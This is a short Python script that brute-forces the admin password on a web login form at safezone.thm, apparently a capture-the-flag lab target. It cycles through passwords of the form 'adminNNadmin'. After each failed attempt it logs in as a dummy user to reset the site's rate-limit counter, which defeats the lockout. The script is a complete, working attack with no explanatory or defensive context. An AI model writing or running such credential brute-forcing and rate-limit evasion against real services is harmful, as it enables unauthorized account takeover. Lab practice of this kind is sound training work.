import requests
import sys

URL = "http://safezone.thm/index.php"

session = requests.Session()

def login(username, password):
    data = {
        "username": username,
        "password": password,
        "submit": "Submit"
    }

    r = session.post(URL, data=data, allow_redirects=True)
    return r.text


def is_success(response_text):
    return "dashboard.php" in response_text


print("[*] Starting brute force...")

for i in range(100):
    digits = f"{i:02d}"
    admin_password = f"admin{digits}admin"

    print(f"[*] Trying admin:{admin_password}")

    response = login("admin", admin_password)

    if is_success(response):
        print("\n[+] SUCCESS!")
        print(f"[+] Password found: {admin_password}")
        sys.exit(0)

    print("[!] Failed — resetting counter with user a")

    # Reset rate limit
    login("a", "a")

print("\n[-] Password not found")
